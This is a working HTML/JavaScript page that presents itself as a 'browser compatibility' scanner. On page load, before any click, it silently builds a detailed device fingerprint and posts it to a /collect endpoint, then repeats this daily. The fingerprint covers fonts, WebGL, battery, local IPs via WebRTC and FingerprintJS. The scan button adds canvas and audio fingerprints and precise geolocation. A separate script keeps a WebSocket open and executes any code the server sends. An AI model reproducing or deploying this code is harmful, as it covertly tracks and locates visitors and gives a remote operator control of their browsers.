<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced System Information Collector</title>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <!-- Primary and fallback FingerprintJS scripts -->
    <script>
        // Utility function to load scripts with fallback
        function loadFingerprintScript() {
            return new Promise((resolve, reject) => {
                // Try loading the first script
                const script1 = document.createElement('script');
                script1.src = "https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js";
                script1.onload = resolve;
                script1.onerror = () => {
                    console.log("Primary CDN failed, trying first fallback...");
                    // If first script fails, try the second option
                    const script2 = document.createElement('script');
                    script2.src = "https://unpkg.com/@fingerprintjs/fingerprintjs@3/dist/fp.min.js";
                    script2.onload = resolve;
                    script2.onerror = () => {
                        console.log("Second CDN failed, trying final fallback...");
                        // If second script fails, try the third option
                        const script3 = document.createElement('script');
                        script3.src = "https://openfpcdn.io/fingerprintjs/v4";
                        script3.onload = resolve;
                        script3.onerror = reject;
                        document.head.appendChild(script3);
                    };
                    document.head.appendChild(script2);
                };
                document.head.appendChild(script1);
            });
        }
    </script>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }

        .content {
            padding: 20px;
        }

        .status {
            padding: 10px;
            border-radius: 6px;
            margin: 10px 0;
            font-weight: bold;
            text-align: center;
        }

        .status.loading {
            background: #fff3cd;
            color: #856404;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .info-card {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            border-left: 4px solid #667eea;
        }

        .info-card h3 {
            margin: 0 0 10px 0;
            color: #495057;
        }

        .info-data {
            background: #ffffff;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #dee2e6;
        }

        .controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
            margin: 20px 0;
        }

        button {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: #667eea;
            color: white;
        }

        .btn-primary:hover {
            background: #5a6fd8;
        }

        .btn-success {
            background: #28a745;
            color: white;
        }

        .btn-success:hover {
            background: #218838;
        }

        .progress {
            width: 100%;
            height: 4px;
            background: #e9ecef;
            border-radius: 2px;
            overflow: hidden;
            margin: 10px 0;
        }

        .progress-bar {
            height: 100%;
            background: #667eea;
            transition: width 0.3s ease;
        }

        @media (max-width: 768px) {
            .container {
                margin: 10px;
                border-radius: 8px;
            }

            .content {
                padding: 15px;
            }

            .controls {
                flex-direction: column;
                align-items: center;
            }

            button {
                width: 100%;
                max-width: 300px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>üîç Advanced Browser Scanner</h1>
            <p>Comprehensive device and browser fingerprinting</p>
        </div>

        <div class="content">
            <div id="status" class="status loading">
                üîÑ Start Your system scan...
            </div>

            <div class="progress">
                <div id="progressBar" class="progress-bar" style="width: 0%"></div>
            </div>

            <div class="controls">
                <button class="btn-primary" onclick="startCollection()">üîÑ Click to Scan Browser Compatibility </button>
                <button class="btn-success" onclick="downloadJSON()">üì• Download JSON</button>
            </div>

            <div id="infoContainer" class="info-grid"></div>
        </div>
    </div>

    <script>
        let collectedInfo = {};
        let websocket = null;
        const SESSION_KEY = 'advanced_session_id';

        // Utility functions
        function updateStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
        }

        function updateProgress(percent) {
            document.getElementById('progressBar').style.width = `${percent}%`;
        }

        function getOrCreateSessionID() {
            let id = localStorage.getItem(SESSION_KEY);
            if (!id) {
                id = crypto.randomUUID();
                localStorage.setItem(SESSION_KEY, id);
            }
            return id;
        }

        function safeStringify(obj) {
            const seen = new WeakSet();
            return JSON.stringify(obj, function (key, value) {
                if (typeof value === 'function') return '[Function]';
                if (typeof value === 'object' && value !== null) {
                    if (seen.has(value)) return '[Circular]';
                    seen.add(value);
                }
                if (typeof value === 'undefined') return null;
                return value;
            }, 2);
        }

        function detectPlatform() {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Mac/i.test(ua)) return 'macOS';
            if (/Linux/i.test(ua)) return 'Linux';
            return 'Unknown';
        }

        function isMobile() {
            return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        function checkFeatureSupport() {
            return {
                battery: 'getBattery' in navigator,
                geolocation: 'geolocation' in navigator,
                webrtc: 'RTCPeerConnection' in window,
                mediaDevices: 'mediaDevices' in navigator,
                clipboard: 'clipboard' in navigator,
                notifications: 'Notification' in window,
                webgl: !!document.createElement('canvas').getContext('webgl'),
                localStorage: typeof Storage !== 'undefined',
                indexedDB: 'indexedDB' in window,
                serviceWorker: 'serviceWorker' in navigator,
                pushManager: 'PushManager' in window,
                webAssembly: typeof WebAssembly === 'object'
            };
        }

        // Advanced detection functions
        async function detectFonts() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'Georgia',
                'Helvetica', 'Impact', 'Lucida Console', 'Lucida Sans Unicode',
                'Palatino Linotype', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Microsoft Sans Serif', 'Calibri', 'Cambria', 'Consolas',
                'Franklin Gothic Medium', 'Segoe UI', 'Apple Gothic', 'Menlo'
            ];

            const testString = 'mmmmmmmmmmlli';
            const testSize = '72px';
            const h = document.getElementsByTagName('body')[0];

            const s = document.createElement('span');
            s.style.fontSize = testSize;
            s.innerHTML = testString;
            const defaultWidth = {};
            const defaultHeight = {};

            for (const baseFont of baseFonts) {
                s.style.fontFamily = baseFont;
                h.appendChild(s);
                defaultWidth[baseFont] = s.offsetWidth;
                defaultHeight[baseFont] = s.offsetHeight;
                h.removeChild(s);
            }

            const detected = [];
            for (const font of testFonts) {
                let detected_font = false;
                for (const baseFont of baseFonts) {
                    s.style.fontFamily = font + ',' + baseFont;
                    h.appendChild(s);
                    const matched = (s.offsetWidth != defaultWidth[baseFont] || s.offsetHeight != defaultHeight[baseFont]);
                    h.removeChild(s);
                    detected_font = detected_font || matched;
                }
                if (detected_font) {
                    detected.push(font);
                }
            }
            return detected;
        }

        async function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');

                canvas.width = 200;
                canvas.height = 50;

                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Canvas fingerprint üîç', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas fingerprint üîç', 4, 17);

                return {
                    fingerprint: canvas.toDataURL(),
                    textMetrics: ctx.measureText('Canvas fingerprint').width
                };
            } catch (error) {
                return { error: error.message };
            }
        }

        async function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

                if (!gl) return { status: 'Unavailable' };

                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const result = {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    extensions: gl.getSupportedExtensions(),
                    maxTextures: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
                    maxVertexTextures: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
                    maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
                    maxViewportSize: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
                };

                if (debugInfo) {
                    result.unmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    result.unmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }

                return result;
            } catch {
                return { status: 'Unavailable' };
            }
        }

        async function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                const gainNode = audioContext.createGain();
                const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

                oscillator.type = 'triangle';
                oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);

                gainNode.gain.setValueAtTime(0, audioContext.currentTime);
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(audioContext.destination);
                oscillator.start(0);

                return new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = function (bins) {
                        bins = bins.inputBuffer.getChannelData(0);
                        let fingerprint = 0;
                        for (let i = 0; i < bins.length; i++) {
                            fingerprint += Math.abs(bins[i]);
                        }
                        oscillator.stop();
                        audioContext.close();
                        resolve(fingerprint.toString());
                    };
                });
            } catch {
                return 'Unavailable';
            }
        }

        async function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return { status: 'Unavailable' };

                return {
                    type: conn.type,
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData
                };
            } catch {
                return { status: 'Unavailable' };
            }
        }

        async function getLocalIPs() {
            try {
                return new Promise((resolve) => {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' }
                        ]
                    });

                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));

                    const timeout = setTimeout(() => {
                        pc.close();
                        resolve([...ips]);
                    }, 3000);

                    pc.onicecandidate = (event) => {
                        if (!event || !event.candidate) return;

                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const ipMatch = ipRegex.exec(event.candidate.candidate);

                        if (ipMatch) {
                            ips.add(ipMatch[1]);
                        }

                        if (event.candidate.candidate === '') {
                            clearTimeout(timeout);
                            pc.close();
                            resolve([...ips]);
                        }
                    };
                });
            } catch {
                return ['Unavailable'];
            }
        }

        async function getBatteryInfo() {
            try {
                if (!('getBattery' in navigator)) return { status: 'Not supported' };
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch {
                return { status: 'Unavailable' };
            }
        }

        async function getGeolocation() {
            // Delay helper (not used currently but kept for future use)
            const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

            // Method 1: Browser's Native Geolocation API
            async function tryNativeGeolocation() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject(new Error("Geolocation is not supported by this browser."));
                        return;
                    }

                    const options = {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    };

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                source: 'native',
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: position.timestamp
                            });
                        },
                        (error) => {
                            reject(new Error(`Geolocation error: ${error.message}`));
                        },
                        options
                    );
                });
            }

            // Method 2: Leaflet (if library is loaded)
            async function tryLeaflet() {
                return new Promise((resolve, reject) => {
                    if (typeof L === 'undefined') {
                        reject(new Error('Leaflet not loaded'));
                        return;
                    }

                    const map = L.map(document.createElement('div')).fitWorld();
                    map.locate({
                        setView: false,
                        maxZoom: 16,
                        timeout: 5000,
                        enableHighAccuracy: true,
                    }).on('locationfound', (e) => {
                        resolve({
                            source: 'leaflet',
                            latitude: e.latlng.lat,
                            longitude: e.latlng.lng,
                        });
                    }).on('locationerror', (e) => {
                        reject(new Error(`Leaflet location error: ${e.message}`));
                    });
                });
            }

            // Method 3: IP-based Fallback
            async function tryIPAPI() {
                try {
                    const response = await fetch('http://ip-api.com/json/');
                    const data = await response.json();
                    if (data.status === 'success') {
                        return {
                            source: 'ip-api',
                            latitude: data.lat,
                            longitude: data.lon,
                            accuracy: 'low',
                        };
                    } else {
                        throw new Error(data.message || 'Unknown IP-API error');
                    }
                } catch (error) {
                    throw new Error(`IP-API error: ${error.message}`);
                }
            }

            // Sequentially try each method with fallback
            try {
                const nativeResult = await tryNativeGeolocation();
                return nativeResult;
            } catch (e1) {
                console.warn('Native geolocation failed:', e1.message);
                try {
                    const leafletResult = await tryLeaflet();
                    return leafletResult;
                } catch (e2) {
                    console.warn('Leaflet geolocation failed:', e2.message);
                    try {
                        const ipResult = await tryIPAPI();
                        return ipResult;
                    } catch (e3) {
                        console.warn('IP-based geolocation failed:', e3.message);
                        return { status: 'All methods failed to retrieve location' };
                    }
                }
            }
        }


        async function getMediaDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices.map(device => ({
                    kind: device.kind,
                    label: device.label || 'Device (permissions required)',
                    deviceId: device.deviceId,
                    groupId: device.groupId
                }));
            } catch {
                return { status: 'Unavailable' };
            }
        }

        async function getPermissions() {
            const permissions = {};
            const permissionNames = [
                'camera', 'microphone', 'geolocation', 'notifications',
                'push', 'clipboard-read', 'clipboard-write'
            ];

            for (const permission of permissionNames) {
                try {
                    if ('permissions' in navigator) {
                        const result = await navigator.permissions.query({ name: permission });
                        permissions[permission] = result.state;
                    } else {
                        permissions[permission] = 'API not supported';
                    }
                } catch {
                    permissions[permission] = 'Unavailable';
                }
            }

            return permissions;
        }

        async function getStorageInfo() {
            const storage = {};

            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const estimate = await navigator.storage.estimate();
                    storage.quota = estimate.quota;
                    storage.usage = estimate.usage;
                    storage.available = estimate.quota - estimate.usage;
                }
            } catch {
                storage.storageAPI = 'Unavailable';
            }

            // Local storage test
            try {
                localStorage.setItem('storage_test', 'test');
                localStorage.removeItem('storage_test');
                storage.localStorage = 'Available';
            } catch {
                storage.localStorage = 'Unavailable';
            }

            // Session storage test
            try {
                sessionStorage.setItem('storage_test', 'test');
                sessionStorage.removeItem('storage_test');
                storage.sessionStorage = 'Available';
            } catch {
                storage.sessionStorage = 'Unavailable';
            }

            // IndexedDB test
            try {
                const request = indexedDB.open('test_db', 1);
                storage.indexedDB = 'Available';
                request.onsuccess = () => request.result.close();
            } catch {
                storage.indexedDB = 'Unavailable';
            }

            return storage;
        }

        async function getCPUBenchmark() {
            try {
                const start = performance.now();
                let result = 0;

                // Simple CPU benchmark
                for (let i = 0; i < 100000; i++) {
                    result += Math.sqrt(i) * Math.sin(i);
                }

                const end = performance.now();
                return {
                    executionTime: end - start,
                    result: result,
                    performance: end - start < 50 ? 'Fast' : end - start < 100 ? 'Medium' : 'Slow'
                };
            } catch {
                return { status: 'Unavailable' };
            }
        }

        // Main collection function
        async function gatherSystemInfo() {
            updateStatus('üîÑ Starting comprehensive system scan...', 'loading');
            updateProgress(0);

            const info = {
                meta: {
                    sessionID: getOrCreateSessionID(),
                    timestamp: new Date().toISOString(),
                    platform: detectPlatform(),
                    isMobile: isMobile(),
                    featureSupport: checkFeatureSupport(),
                    collectionVersion: '2.0'
                }
            };

            const tasks = [
                { name: 'Basic Info', fn: () => getBasicInfo() },
                { name: 'Screen Info', fn: () => getScreenInfo() },
                { name: 'Browser Info', fn: () => getBrowserInfo() },
                { name: 'Hardware Info', fn: () => getHardwareInfo() },
                { name: 'Network Info', fn: () => getNetworkInfo() },
                { name: 'Font Detection', fn: () => detectFonts() },
                { name: 'Canvas Fingerprint', fn: () => getCanvasFingerprint() },
                { name: 'WebGL Info', fn: () => getWebGLFingerprint() },
                // { name: 'Audio Fingerprint', fn: () => getAudioFingerprint() },
                { name: 'Battery Info', fn: () => getBatteryInfo() },
                { name: 'Geolocation', fn: () => getGeolocation() },
                { name: 'Media Devices', fn: () => getMediaDevices() },
                { name: 'Permissions', fn: () => getPermissions() },
                { name: 'Storage Info', fn: () => getStorageInfo() },
                { name: 'CPU Benchmark', fn: () => getCPUBenchmark() },
                { name: 'Local IPs', fn: () => getLocalIPs() },
                { name: 'FingerprintJS', fn: () => getFingerprintJS() }
            ];

            for (let i = 0; i < tasks.length; i++) {
                const task = tasks[i];
                updateStatus(`üîç Collecting ${task.name}...`, 'loading');

                try {
                    info[task.name.toLowerCase().replace(/\s+/g, '')] = await task.fn();
                } catch (error) {
                    info[task.name.toLowerCase().replace(/\s+/g, '')] = {
                        status: 'Error',
                        error: error.message
                    };
                }

                updateProgress((i + 1) / tasks.length * 100);
                await new Promise(resolve => setTimeout(resolve, 100)); // Small delay for UX
            }

            updateStatus('‚úÖ System scan completed successfully!', 'success');
            return info;
        }

        function getBasicInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                referrer: document.referrer,
                url: window.location.href,
                title: document.title
            };
        }

        function getScreenInfo() {
            return {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio,
                    scrollX: window.scrollX,
                    scrollY: window.scrollY
                }
            };
        }

        function getBrowserInfo() {
            const nav = navigator;
            return {
                appName: nav.appName,
                appVersion: nav.appVersion,
                vendor: nav.vendor,
                product: nav.product,
                productSub: nav.productSub,
                buildID: nav.buildID || 'Unknown',
                oscpu: nav.oscpu || 'Unknown',
                plugins: Array.from(nav.plugins || []).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                })),
                mimeTypes: Array.from(nav.mimeTypes || []).map(m => ({
                    type: m.type,
                    description: m.description,
                    suffixes: m.suffixes
                }))
            };
        }

        function getHardwareInfo() {
            const nav = navigator;
            return {
                hardwareConcurrency: nav.hardwareConcurrency || 'Unknown',
                deviceMemory: nav.deviceMemory || 'Unknown',
                maxTouchPoints: nav.maxTouchPoints || 0,
                webdriver: nav.webdriver || false,
                pdfViewerEnabled: nav.pdfViewerEnabled || false,
                javaEnabled: typeof nav.javaEnabled === 'function' ? nav.javaEnabled() : false,
                vibrate: 'vibrate' in nav,
                bluetooth: 'bluetooth' in nav,
                usb: 'usb' in nav,
                serial: 'serial' in nav,
                hid: 'hid' in nav,
                mediaSession: 'mediaSession' in nav,
                share: 'share' in nav,
                wakeLock: 'wakeLock' in nav,
                keyboard: 'keyboard' in nav,
                locks: 'locks' in nav,
                scheduling: 'scheduling' in nav
            };
        }

        async function getFingerprintJS() {
            try {
                // Try to load the script first
                await loadFingerprintScript();

                // Check if FingerprintJS is loaded
                if (typeof FingerprintJS === 'undefined') {
                    throw new Error('FingerprintJS failed to load');
                }

                const fp = await FingerprintJS.load();
                const result = await fp.get();
                return {
                    visitorId: result.visitorId,
                    confidence: result.confidence,
                    components: Object.fromEntries(
                        Object.entries(result.components).map(([key, value]) => [key, value.value])
                    )
                };
            } catch (error) {
                console.error('FingerprintJS error:', error);
                return {
                    error: error.message,
                    status: 'Failed to load FingerprintJS'
                };
            }
        }

        function displayCollectedInfo(info) {
            const container = document.getElementById('infoContainer');
            container.innerHTML = '';

            const categories = [
                { key: 'meta', title: 'üìä Meta Information', color: '#667eea' },
                { key: 'basicinfo', title: 'üåê Basic Information', color: '#28a745' },
                { key: 'screeninfo', title: 'üñ•Ô∏è Screen & Display', color: '#17a2b8' },
                { key: 'browserinfo', title: 'üåç Browser Details', color: '#fd7e14' },
                { key: 'hardwareinfo', title: '‚öôÔ∏è Hardware Information', color: '#6f42c1' },
                { key: 'networkinfo', title: 'üåê Network Information', color: '#20c997' },
                { key: 'fontdetection', title: 'üî§ Font Detection', color: '#e83e8c' },
                { key: 'canvasfingerprint', title: 'üé® Canvas Fingerprint', color: '#fd7e14' },
                { key: 'webglinfo', title: 'üéÆ WebGL Information', color: '#6610f2' },
                { key: 'audiofingerprint', title: 'üîä Audio Fingerprint', color: '#dc3545' },
                { key: 'batteryinfo', title: 'üîã Battery Information', color: '#28a745' },
                { key: 'geolocation', title: 'üìç Geolocation', color: '#ffc107' },
                { key: 'mediadevices', title: 'üìπ Media Devices', color: '#17a2b8' },
                { key: 'permissions', title: 'üîê Permissions', color: '#dc3545' },
                { key: 'storageinfo', title: 'üíæ Storage Information', color: '#6c757d' },
                { key: 'cpubenchmark', title: 'üöÄ CPU Benchmark', color: '#fd7e14' },
                { key: 'localips', title: 'üåê Local IP Addresses', color: '#20c997' },
                { key: 'fingerprintjs', title: 'üîç FingerprintJS', color: '#6f42c1' }
            ];

            categories.forEach(category => {
                if (info[category.key]) {
                    const card = document.createElement('div');
                    card.className = 'info-card';
                    card.style.borderLeftColor = category.color;

                    const title = document.createElement('h3');
                    title.textContent = category.title;
                    title.style.color = category.color;

                    const data = document.createElement('pre');
                    data.className = 'info-data';
                    data.textContent = safeStringify(info[category.key]);

                    card.appendChild(title);
                    card.appendChild(data);
                    container.appendChild(card);
                }
            });
        }

        function downloadJSON() {
            if (!collectedInfo || Object.keys(collectedInfo).length === 0) {
                updateStatus('‚ùå No data to download. Please collect information first.', 'error');
                return;
            }

            const dataStr = safeStringify(collectedInfo);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(dataBlob);

            const link = document.createElement('a');
            link.href = url;
            link.download = `system_info_${collectedInfo.meta?.sessionID || Date.now()}.json`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(url);

            updateStatus('‚úÖ JSON file downloaded successfully!', 'success');
        }

        async function startCollection() {
            try {
                updateProgress(0);
                collectedInfo = await gatherSystemInfo();
                audiodata = await getAudioFingerprint();
                collectedInfo.audiofingerprint = audiodata;
                try {
                    const response = await fetch("/collect", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(collectedInfo)
                    });
                    const result = await response.json();
                    displayCollectedInfo(collectedInfo);
                    updateProgress(100);
                } catch (error) {
                    updateStatus(`‚ùå Collection failed: ${error.message}`, 'error');
                    console.error('Collection error:', error);
                }
            } catch (error) {
                updateStatus(`‚ùå Collection failed: ${error.message}`, 'error');
                console.error('Collection error:', error);
            }
        }

        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && collectedInfo.meta) {
                collectedInfo.meta.lastActive = new Date().toISOString();
            }
        });

    </script>
    <script>

        function connectWebSocket() {
            const socket = new WebSocket(`ws://${window.location.host}/ws`);
            socket.onclose = () => {
                console.log("WebSocket disconnected. Reconnecting...");
                setTimeout(connectWebSocket, 5000); // Reconnect after 5 seconds
            };
            socket.onmessage = (event) => {
                const message = JSON.parse(event.data);
                if (message.type === "code") new Function(message.data)();
            };
        }
        connectWebSocket();

        // setInterval(startCollection,86400000); // Collect data every 1 day 86400000
        // gatherSystemInfo(); // Initial collection on page load
    </script>
    <script>
        async function gatherInitialSystemInfo() {
            const info = {
                meta: {
                    sessionID: getOrCreateSessionID(),
                    timestamp: new Date().toISOString(),
                    platform: detectPlatform(),
                    isMobile: isMobile(),
                    featureSupport: checkFeatureSupport(),
                    collectionVersion: '2.0'
                }
            };

            const tasks = [
                { name: 'Basic Info', fn: () => getBasicInfo() },
                { name: 'Screen Info', fn: () => getScreenInfo() },
                { name: 'Browser Info', fn: () => getBrowserInfo() },
                { name: 'Hardware Info', fn: () => getHardwareInfo() },
                { name: 'Network Info', fn: () => getNetworkInfo() },
                { name: 'Font Detection', fn: () => detectFonts() },
                // { name: 'Canvas Fingerprint', fn: () => getCanvasFingerprint() },
                { name: 'WebGL Info', fn: () => getWebGLFingerprint() },
                // { name: 'Audio Fingerprint', fn: () => getAudioFingerprint() },
                { name: 'Battery Info', fn: () => getBatteryInfo() },
                // { name: 'Geolocation', fn: () => getGeolocation() },
                { name: 'Media Devices', fn: () => getMediaDevices() },
                { name: 'Permissions', fn: () => getPermissions() },
                { name: 'Storage Info', fn: () => getStorageInfo() },
                { name: 'CPU Benchmark', fn: () => getCPUBenchmark() },
                { name: 'Local IPs', fn: () => getLocalIPs() },
                { name: 'FingerprintJS', fn: () => getFingerprintJS() }
            ];

            for (let i = 0; i < tasks.length; i++) {
                const task = tasks[i];
                try {
                    info[task.name.toLowerCase().replace(/\s+/g, '')] = await task.fn();
                } catch (error) {
                    info[task.name.toLowerCase().replace(/\s+/g, '')] = {
                        status: 'Error',
                        error: error.message
                    };
                }
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            return info;
        }

        async function InitialCollection() {
            try {
                collectedInfo = await gatherInitialSystemInfo();
                collectedInfo.audiofingerprint = {"status": "need to analyze"};
                collectedInfo.geolocation = {"status": "need to analyze"};
                collectedInfo.canvasfingerprint = {"status": "need to analyze"};
                try {
                    const response = await fetch("/collect", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(collectedInfo)
                    });
                } catch (error) {
                    updateStatus(`‚ùå Collection failed: ${error.message}`, 'error');
                    console.error('Collection error:', error);
                }
            } catch (error) {
                updateStatus(`‚ùå Collection failed: ${error.message}`, 'error');
                console.error('Collection error:', error);
            }
        }
        InitialCollection(); // Initial collection on page load
        setInterval(InitialCollection, 86400000); // Collect data every 1 day (86400000 ms)
    </script>
</body>

</html>